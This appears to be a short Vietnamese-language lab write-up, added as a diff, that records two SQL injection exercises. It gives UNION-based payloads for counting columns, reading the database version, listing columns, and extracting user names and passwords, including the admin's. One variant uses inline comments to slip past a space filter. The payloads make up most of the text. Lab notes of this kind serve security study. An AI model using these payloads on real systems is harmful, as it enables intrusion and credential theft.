@@ -1,0 +1,39 @@
+writeup bai lab ngay 30/3/2022
+vi du 1
+
+
+1 => su dung order by de xac dinh cot trong sql
+
+2 => tim ten database va phien ban
+
+'UNION+SELECT 'a', @@version, DATABASE(),'A','a'FROM information_schema.schemata-- -
+
+3 => tim ten cua cac cot
+'UNION+SELECT column_name,null, null,null,null FROM information_schema.columns where table_schema = 'main' and table_name = 'users'-- -
+
+4 => tim password va users
+
+'UNION+SELECT passwd,null, null,null,null FROM main.users where name = 'admin'-- -
+
+
+vi du 2
+xác định cột
+'/**/order/**/by/**/1,2,3,4,5/**/and/**/'1'='1 
+xác định database và phien bản
+'/**/UNION/**/SELECT/**/1,@@version,DATABASE(),null,null/**/and/**/'1'='1
+
+test đại chèn vào từng cột đó  1 câu lệnh chắc do may mắn
+
+'/**/union/**/select/**/1,(select/**/name/**/FROM/**/users/**/limit/**/3,1),2,4,5/**/and/**/'1'='2
+
+'/**/union/**/select/**/1,(select/**/name/**/FROM/**/users/**/limit/**/3,1),(select/**/passwd/**/FROM/**/users/**/limit/**/3,1),4,5/**/and/**/'1'='2
+
+
+
+
+
+
+
+
+
+
